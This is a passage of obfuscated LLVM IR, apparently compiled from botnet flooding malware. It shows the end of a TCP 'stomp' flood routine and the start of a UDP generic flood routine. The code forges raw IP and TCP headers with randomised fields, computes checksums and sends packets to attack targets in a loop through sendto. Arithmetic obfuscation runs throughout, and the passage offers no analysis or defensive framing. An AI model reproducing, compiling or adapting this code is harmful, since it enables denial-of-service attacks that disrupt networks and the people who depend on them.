  %333 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i64 1
  %335 = bitcast %struct.iphdr* %334 to %struct.tcphdr*
  store %struct.tcphdr* %335, %struct.tcphdr** %40, align 8
  %336 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %337 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %336, i64 1
  %338 = bitcast %struct.tcphdr* %337 to i8*
  store i8* %338, i8** %41, align 8
  %339 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %340 = bitcast %struct.iphdr* %339 to i8*
  %341 = load i8, i8* %340, align 4
  %342 = xor i8 %341, -1
  %343 = xor i8 15, -1
  %344 = xor i8 115, -1
  %345 = or i8 %342, %343
  %346 = or i8 115, %344
  %347 = xor i8 %345, -1
  %348 = and i8 %347, %346
  %349 = and i8 %341, 15
  %350 = and i8 %348, 64
  %351 = xor i8 %348, 64
  %352 = or i8 %350, %351
  %353 = or i8 %348, 64
  store i8 %352, i8* %340, align 4
  %354 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %355 = bitcast %struct.iphdr* %354 to i8*
  %356 = load i8, i8* %355, align 4
  %357 = xor i8 -16, -1
  %358 = xor i8 %356, %357
  %359 = and i8 %358, %356
  %360 = and i8 %356, -16
  %361 = and i8 %359, 5
  %362 = xor i8 %359, 5
  %363 = or i8 %361, %362
  %364 = or i8 %359, 5
  store i8 %363, i8* %355, align 4
  %365 = load i8, i8* %15, align 1
  %366 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 1
  store i8 %365, i8* %367, align 1
  %368 = load i32, i32* %26, align 4
  %369 = sext i32 %368 to i64
  %370 = sub i64 40, -69305019607200303
  %371 = add i64 %370, %369
  %372 = add i64 %371, -69305019607200303
  %373 = add i64 40, %369
  %374 = trunc i64 %372 to i16
  %375 = call zeroext i16 @htons(i16 zeroext %374) #7
  %376 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 2
  store i16 %375, i16* %377, align 2
  %378 = load i16, i16* %16, align 2
  %379 = call zeroext i16 @htons(i16 zeroext %378) #7
  %380 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 3
  store i16 %379, i16* %381, align 4
  %382 = load i8, i8* %17, align 1
  %383 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 5
  store i8 %382, i8* %384, align 4
  %385 = load i8, i8* %18, align 1
  %386 = icmp ne i8 %385, 0
  br i1 %386, label %387, label %391

; <label>:387:                                    ; preds = %274
  %388 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %389 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 4
  store i16 %388, i16* %390, align 2
  br label %391

; <label>:391:                                    ; preds = %387, %274
  %392 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 6
  store i8 6, i8* %393, align 1
  %394 = load i32, i32* @LOCAL_ADDR, align 4
  %395 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 8
  store i32 %394, i32* %396, align 4
  %397 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %398 = load i32, i32* %11, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %400, i32 0, i32 0
  %402 = load i32, i32* %401, align 4
  %403 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 9
  store i32 %402, i32* %404, align 4
  %405 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %406 = load i32, i32* %11, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %408, i32 0, i32 3
  %410 = load i16, i16* %409, align 4
  %411 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  store i16 %410, i16* %412, align 4
  %413 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %414 = load i32, i32* %11, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %416, i32 0, i32 4
  %418 = load i16, i16* %417, align 2
  %419 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 1
  store i16 %418, i16* %420, align 2
  %421 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %422 = load i32, i32* %11, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %421, i64 %423
  %425 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %424, i32 0, i32 2
  %426 = load i32, i32* %425, align 4
  %427 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 2
  store i32 %426, i32* %428, align 4
  %429 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %430 = load i32, i32* %11, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %432, i32 0, i32 1
  %434 = load i32, i32* %433, align 4
  %435 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 3
  store i32 %434, i32* %436, align 4
  %437 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = xor i16 %439, -1
  %441 = xor i16 -241, -1
  %442 = xor i16 -14863, -1
  %443 = or i16 %440, %441
  %444 = or i16 -14863, %442
  %445 = xor i16 %443, -1
  %446 = and i16 %445, %444
  %447 = and i16 %439, -241
  %448 = and i16 %446, 128
  %449 = xor i16 %446, 128
  %450 = or i16 %448, %449
  %451 = or i16 %446, 128
  store i16 %450, i16* %438, align 4
  %452 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 4
  %454 = load i16, i16* %453, align 4
  %455 = xor i16 %454, -1
  %456 = xor i16 -257, -1
  %457 = xor i16 -1540, -1
  %458 = or i16 %455, %456
  %459 = or i16 -1540, %457
  %460 = xor i16 %458, -1
  %461 = and i16 %460, %459
  %462 = and i16 %454, -257
  %463 = and i16 %461, 256
  %464 = xor i16 %461, 256
  %465 = or i16 %463, %464
  %466 = or i16 %461, 256
  store i16 %465, i16* %453, align 4
  %467 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 4
  %469 = load i16, i16* %468, align 4
  %470 = xor i16 -4097, -1
  %471 = xor i16 %469, %470
  %472 = and i16 %471, %469
  %473 = and i16 %469, -4097
  %474 = and i16 %472, 4096
  %475 = xor i16 %472, 4096
  %476 = or i16 %474, %475
  %477 = or i16 %472, 4096
  store i16 %476, i16* %468, align 4
  %478 = call i32 @rand_next()
  %479 = xor i32 65535, -1
  %480 = xor i32 %478, %479
  %481 = and i32 %480, %478
  %482 = and i32 %478, 65535
  %483 = trunc i32 %481 to i16
  %484 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 5
  store i16 %483, i16* %485, align 2
  %486 = load i8, i8* %20, align 1
  %487 = sext i8 %486 to i16
  %488 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 4
  %490 = load i16, i16* %489, align 4
  %491 = xor i16 %487, -1
  %492 = xor i16 1, -1
  %493 = xor i16 -13346, -1
  %494 = or i16 %491, %492
  %495 = or i16 -13346, %493
  %496 = xor i16 %494, -1
  %497 = and i16 %496, %495
  %498 = and i16 %487, 1
  %499 = shl i16 %497, 13
  %500 = xor i16 %490, -1
  %501 = xor i16 -8193, -1
  %502 = xor i16 -18199, -1
  %503 = or i16 %500, %501
  %504 = or i16 -18199, %502
  %505 = xor i16 %503, -1
  %506 = and i16 %505, %504
  %507 = and i16 %490, -8193
  %508 = xor i16 %506, -1
  %509 = xor i16 %499, -1
  %510 = xor i16 11099, -1
  %511 = and i16 %508, 11099
  %512 = and i16 %506, %510
  %513 = and i16 %509, 11099
  %514 = and i16 %499, %510
  %515 = or i16 %511, %512
  %516 = or i16 %513, %514
  %517 = xor i16 %515, %516
  %518 = or i16 %508, %509
  %519 = xor i16 %518, -1
  %520 = or i16 11099, %510
  %521 = and i16 %519, %520
  %522 = or i16 %517, %521
  %523 = or i16 %506, %499
  store i16 %522, i16* %489, align 4
  %524 = load i8, i8* %21, align 1
  %525 = sext i8 %524 to i16
  %526 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 4
  %528 = load i16, i16* %527, align 4
  %529 = xor i16 1, -1
  %530 = xor i16 %525, %529
  %531 = and i16 %530, %525
  %532 = and i16 %525, 1
  %533 = shl i16 %531, 12
  %534 = xor i16 -4097, -1
  %535 = xor i16 %528, %534
  %536 = and i16 %535, %528
  %537 = and i16 %528, -4097
  %538 = and i16 %536, %533
  %539 = xor i16 %536, %533
  %540 = or i16 %538, %539
  %541 = or i16 %536, %533
  store i16 %540, i16* %527, align 4
  %542 = load i8, i8* %22, align 1
  %543 = sext i8 %542 to i16
  %544 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 4
  %546 = load i16, i16* %545, align 4
  %547 = xor i16 %543, -1
  %548 = xor i16 1, -1
  %549 = xor i16 -9636, -1
  %550 = or i16 %547, %548
  %551 = or i16 -9636, %549
  %552 = xor i16 %550, -1
  %553 = and i16 %552, %551
  %554 = and i16 %543, 1
  %555 = shl i16 %553, 11
  %556 = xor i16 -2049, -1
  %557 = xor i16 %546, %556
  %558 = and i16 %557, %546
  %559 = and i16 %546, -2049
  %560 = xor i16 %558, -1
  %561 = xor i16 %555, -1
  %562 = xor i16 4571, -1
  %563 = and i16 %560, 4571
  %564 = and i16 %558, %562
  %565 = and i16 %561, 4571
  %566 = and i16 %555, %562
  %567 = or i16 %563, %564
  %568 = or i16 %565, %566
  %569 = xor i16 %567, %568
  %570 = or i16 %560, %561
  %571 = xor i16 %570, -1
  %572 = or i16 4571, %562
  %573 = and i16 %571, %572
  %574 = or i16 %569, %573
  %575 = or i16 %558, %555
  store i16 %574, i16* %545, align 4
  %576 = load i8, i8* %23, align 1
  %577 = sext i8 %576 to i16
  %578 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 4
  %580 = load i16, i16* %579, align 4
  %581 = xor i16 1, -1
  %582 = xor i16 %577, %581
  %583 = and i16 %582, %577
  %584 = and i16 %577, 1
  %585 = shl i16 %583, 10
  %586 = xor i16 %580, -1
  %587 = xor i16 -1025, -1
  %588 = xor i16 31736, -1
  %589 = or i16 %586, %587
  %590 = or i16 31736, %588
  %591 = xor i16 %589, -1
  %592 = and i16 %591, %590
  %593 = and i16 %580, -1025
  %594 = xor i16 %592, -1
  %595 = xor i16 %585, -1
  %596 = xor i16 -1093, -1
  %597 = and i16 %594, -1093
  %598 = and i16 %592, %596
  %599 = and i16 %595, -1093
  %600 = and i16 %585, %596
  %601 = or i16 %597, %598
  %602 = or i16 %599, %600
  %603 = xor i16 %601, %602
  %604 = or i16 %594, %595
  %605 = xor i16 %604, -1
  %606 = or i16 -1093, %596
  %607 = and i16 %605, %606
  %608 = or i16 %603, %607
  %609 = or i16 %592, %585
  store i16 %608, i16* %579, align 4
  %610 = load i8, i8* %24, align 1
  %611 = sext i8 %610 to i16
  %612 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 4
  %614 = load i16, i16* %613, align 4
  %615 = xor i16 1, -1
  %616 = xor i16 %611, %615
  %617 = and i16 %616, %611
  %618 = and i16 %611, 1
  %619 = shl i16 %617, 9
  %620 = xor i16 -513, -1
  %621 = xor i16 %614, %620
  %622 = and i16 %621, %614
  %623 = and i16 %614, -513
  %624 = xor i16 %622, -1
  %625 = xor i16 %619, -1
  %626 = xor i16 14581, -1
  %627 = and i16 %624, 14581
  %628 = and i16 %622, %626
  %629 = and i16 %625, 14581
  %630 = and i16 %619, %626
  %631 = or i16 %627, %628
  %632 = or i16 %629, %630
  %633 = xor i16 %631, %632
  %634 = or i16 %624, %625
  %635 = xor i16 %634, -1
  %636 = or i16 14581, %626
  %637 = and i16 %635, %636
  %638 = or i16 %633, %637
  %639 = or i16 %622, %619
  store i16 %638, i16* %613, align 4
  %640 = load i8, i8* %25, align 1
  %641 = sext i8 %640 to i16
  %642 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %643 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %642, i32 0, i32 4
  %644 = load i16, i16* %643, align 4
  %645 = xor i16 %641, -1
  %646 = xor i16 1, -1
  %647 = xor i16 20338, -1
  %648 = or i16 %645, %646
  %649 = or i16 20338, %647
  %650 = xor i16 %648, -1
  %651 = and i16 %650, %649
  %652 = and i16 %641, 1
  %653 = shl i16 %651, 8
  %654 = xor i16 -257, -1
  %655 = xor i16 %644, %654
  %656 = and i16 %655, %644
  %657 = and i16 %644, -257
  %658 = xor i16 %656, -1
  %659 = xor i16 %653, -1
  %660 = xor i16 -12064, -1
  %661 = and i16 %658, -12064
  %662 = and i16 %656, %660
  %663 = and i16 %659, -12064
  %664 = and i16 %653, %660
  %665 = or i16 %661, %662
  %666 = or i16 %663, %664
  %667 = xor i16 %665, %666
  %668 = or i16 %658, %659
  %669 = xor i16 %668, -1
  %670 = or i16 -12064, %660
  %671 = and i16 %669, %670
  %672 = or i16 %667, %671
  %673 = or i16 %656, %653
  store i16 %672, i16* %643, align 4
  %674 = load i8*, i8** %41, align 8
  %675 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %674, i32 %675)
  %676 = load i8*, i8** %41, align 8
  %677 = load i32, i32* %26, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds i8, i8* %676, i64 %678
  store i8 0, i8* %679, align 1
  br label %727

; <label>:680:                                    ; preds = %263, %248
  %681 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %682 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %681, i32 0, i32 4
  %683 = load i16, i16* %682, align 4
  %684 = lshr i16 %683, 8
  %685 = xor i16 %684, -1
  %686 = xor i16 1, -1
  %687 = xor i16 -21165, -1
  %688 = or i16 %685, %686
  %689 = or i16 -21165, %687
  %690 = xor i16 %688, -1
  %691 = and i16 %690, %689
  %692 = and i16 %684, 1
  %693 = zext i16 %691 to i32
  %694 = icmp ne i32 %693, 0
  br i1 %694, label %710, label %695

; <label>:695:                                    ; preds = %680
  %696 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %697 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %696, i32 0, i32 4
  %698 = load i16, i16* %697, align 4
  %699 = lshr i16 %698, 10
  %700 = xor i16 %699, -1
  %701 = xor i16 1, -1
  %702 = xor i16 3602, -1
  %703 = or i16 %700, %701
  %704 = or i16 3602, %702
  %705 = xor i16 %703, -1
  %706 = and i16 %705, %704
  %707 = and i16 %699, 1
  %708 = zext i16 %706 to i32
  %709 = icmp ne i32 %708, 0
  br i1 %709, label %710, label %713

; <label>:710:                                    ; preds = %695, %680
  %711 = load i32, i32* %29, align 4
  %712 = call i32 @close(i32 %711)
  br label %132

; <label>:713:                                    ; preds = %695
  br label %714

; <label>:714:                                    ; preds = %713
  br label %715

; <label>:715:                                    ; preds = %714, %236
  br label %716

; <label>:716:                                    ; preds = %715, %232, %224
  %717 = call i64 @time(i64* null) #6
  %718 = load i64, i64* %34, align 8
  %719 = sub i64 0, %718
  %720 = add i64 %717, %719
  %721 = sub nsw i64 %717, %718
  %722 = icmp sgt i64 %720, 10
  br i1 %722, label %723, label %726

; <label>:723:                                    ; preds = %716
  %724 = load i32, i32* %29, align 4
  %725 = call i32 @close(i32 %724)
  br label %132

; <label>:726:                                    ; preds = %716
  br label %212

; <label>:727:                                    ; preds = %391
  br label %728

; <label>:728:                                    ; preds = %727, %135
  %729 = load i32, i32* %11, align 4
  %730 = add i32 %729, -1084913657
  %731 = add i32 %730, 1
  %732 = sub i32 %731, -1084913657
  %733 = add nsw i32 %729, 1
  store i32 %732, i32* %11, align 4
  br label %126

; <label>:734:                                    ; preds = %126
  br label %735

; <label>:735:                                    ; preds = %878, %734
  store i32 0, i32* %11, align 4
  br label %736

; <label>:736:                                    ; preds = %866, %735
  %737 = load i32, i32* %11, align 4
  %738 = load i8, i8* %7, align 1
  %739 = zext i8 %738 to i32
  %740 = icmp slt i32 %737, %739
  br i1 %740, label %741, label %872

; <label>:741:                                    ; preds = %736
  %742 = load i8**, i8*** %14, align 8
  %743 = load i32, i32* %11, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds i8*, i8** %742, i64 %744
  %746 = load i8*, i8** %745, align 8
  store i8* %746, i8** %42, align 8
  %747 = load i8*, i8** %42, align 8
  %748 = bitcast i8* %747 to %struct.iphdr*
  store %struct.iphdr* %748, %struct.iphdr** %43, align 8
  %749 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %750 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %749, i64 1
  %751 = bitcast %struct.iphdr* %750 to %struct.tcphdr*
  store %struct.tcphdr* %751, %struct.tcphdr** %44, align 8
  %752 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %753 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %752, i64 1
  %754 = bitcast %struct.tcphdr* %753 to i8*
  store i8* %754, i8** %45, align 8
  %755 = load i16, i16* %16, align 2
  %756 = zext i16 %755 to i32
  %757 = icmp eq i32 %756, 65535
  br i1 %757, label %758, label %771

; <label>:758:                                    ; preds = %741
  %759 = call i32 @rand_next()
  %760 = xor i32 %759, -1
  %761 = xor i32 65535, -1
  %762 = xor i32 285819818, -1
  %763 = or i32 %760, %761
  %764 = or i32 285819818, %762
  %765 = xor i32 %763, -1
  %766 = and i32 %765, %764
  %767 = and i32 %759, 65535
  %768 = trunc i32 %766 to i16
  %769 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %770 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %769, i32 0, i32 3
  store i16 %768, i16* %770, align 4
  br label %771

; <label>:771:                                    ; preds = %758, %741
  %772 = load i8, i8* %27, align 1
  %773 = icmp ne i8 %772, 0
  br i1 %773, label %774, label %781

; <label>:774:                                    ; preds = %771
  %775 = load i8*, i8** %45, align 8
  %776 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %775, i32 %776)
  %777 = load i8*, i8** %45, align 8
  %778 = load i32, i32* %26, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds i8, i8* %777, i64 %779
  store i8 0, i8* %780, align 1
  br label %781

; <label>:781:                                    ; preds = %774, %771
  %782 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %783 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %782, i32 0, i32 7
  store i16 0, i16* %783, align 2
  %784 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %785 = bitcast %struct.iphdr* %784 to i16*
  %786 = call zeroext i16 @checksum_generic(i16* %785, i32 20)
  %787 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %788 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %787, i32 0, i32 7
  store i16 %786, i16* %788, align 2
  %789 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %790 = load i32, i32* %11, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %789, i64 %791
  %793 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %792, i32 0, i32 1
  %794 = load i32, i32* %793, align 4
  %795 = sub i32 0, %794
  %796 = sub i32 0, 1
  %797 = add i32 %795, %796
  %798 = sub i32 0, %797
  %799 = add i32 %794, 1
  store i32 %798, i32* %793, align 4
  %800 = trunc i32 %794 to i16
  %801 = call zeroext i16 @htons(i16 zeroext %800) #7
  %802 = zext i16 %801 to i32
  %803 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %804 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %803, i32 0, i32 2
  store i32 %802, i32* %804, align 4
  %805 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %806 = load i32, i32* %11, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %805, i64 %807
  %809 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %808, i32 0, i32 2
  %810 = load i32, i32* %809, align 4
  %811 = trunc i32 %810 to i16
  %812 = call zeroext i16 @htons(i16 zeroext %811) #7
  %813 = zext i16 %812 to i32
  %814 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %815 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %814, i32 0, i32 3
  store i32 %813, i32* %815, align 4
  %816 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %817 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %816, i32 0, i32 6
  store i16 0, i16* %817, align 4
  %818 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %819 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %820 = bitcast %struct.tcphdr* %819 to i8*
  %821 = load i32, i32* %26, align 4
  %822 = sext i32 %821 to i64
  %823 = sub i64 20, -2432074989086356096
  %824 = add i64 %823, %822
  %825 = add i64 %824, -2432074989086356096
  %826 = add i64 20, %822
  %827 = trunc i64 %825 to i16
  %828 = call zeroext i16 @htons(i16 zeroext %827) #7
  %829 = load i32, i32* %26, align 4
  %830 = sext i32 %829 to i64
  %831 = sub i64 20, -1305675945600822783
  %832 = add i64 %831, %830
  %833 = add i64 %832, -1305675945600822783
  %834 = add i64 20, %830
  %835 = trunc i64 %833 to i32
  %836 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %818, i8* %820, i16 zeroext %828, i32 %835)
  %837 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %838 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %837, i32 0, i32 6
  store i16 %836, i16* %838, align 4
  %839 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %840 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %839, i32 0, i32 1
  %841 = load i16, i16* %840, align 2
  %842 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %843 = load i32, i32* %11, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %842, i64 %844
  %846 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %845, i32 0, i32 0
  %847 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %846, i32 0, i32 1
  store i16 %841, i16* %847, align 2
  %848 = load i32, i32* %12, align 4
  %849 = load i8*, i8** %42, align 8
  %850 = load i32, i32* %26, align 4
  %851 = sext i32 %850 to i64
  %852 = sub i64 40, 541645903432905535
  %853 = add i64 %852, %851
  %854 = add i64 %853, 541645903432905535
  %855 = add i64 40, %851
  %856 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %857 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %858 = load i32, i32* %11, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %857, i64 %859
  %861 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %860, i32 0, i32 0
  %862 = bitcast %struct.sockaddr_in* %861 to %struct.sockaddr*
  store %struct.sockaddr* %862, %struct.sockaddr** %856, align 8
  %863 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %864 = load %struct.sockaddr*, %struct.sockaddr** %863, align 8
  %865 = call i64 @sendto(i32 %848, i8* %849, i64 %854, i32 16384, %struct.sockaddr* %864, i32 16)
  br label %866

; <label>:866:                                    ; preds = %781
  %867 = load i32, i32* %11, align 4
  %868 = add i32 %867, -1892432629
  %869 = add i32 %868, 1
  %870 = sub i32 %869, -1892432629
  %871 = add nsw i32 %867, 1
  store i32 %870, i32* %11, align 4
  br label %736

; <label>:872:                                    ; preds = %736
  %873 = call i64 @time(i64* null) #6
  %874 = load i32, i32* %28, align 4
  %875 = sext i32 %874 to i64
  %876 = icmp sgt i64 %873, %875
  br i1 %876, label %877, label %878

; <label>:877:                                    ; preds = %872
  br label %879

; <label>:878:                                    ; preds = %872
  br label %735

; <label>:879:                                    ; preds = %877, %223, %122, %116
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
